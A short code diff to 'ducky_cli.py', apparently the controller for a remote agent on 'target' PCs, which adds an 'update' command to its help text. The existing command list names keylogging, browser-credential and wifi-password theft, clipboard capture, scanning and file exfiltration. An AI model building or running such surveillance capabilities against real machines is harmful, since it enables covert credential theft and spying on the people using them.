@@ -18,7 +18,7 @@ Commands available per target:
   info, processes, kill <pid>, arp_scan, ports, dns_cache, wifi_passwords,
   browser_creds, keylog start/stop/status/get, clipboard, open_url <url>,
   popup <title> | <message>, ls /path, cat /path, download /path,
-  run_script <name>, status
+  run_script <name>, status, update
 
 Examples:
   ducky_cli.py office-pc info
@@ -506,6 +506,7 @@ def show_command_help():
         "SYSTEM INFO": [
             "info              - OS, hostname, IP address",
             "status            - Agent health and status",
+            "update            - Update agent to latest version from GitHub",
         ],
         "PROCESSES": [
             "processes         - List all running processes",
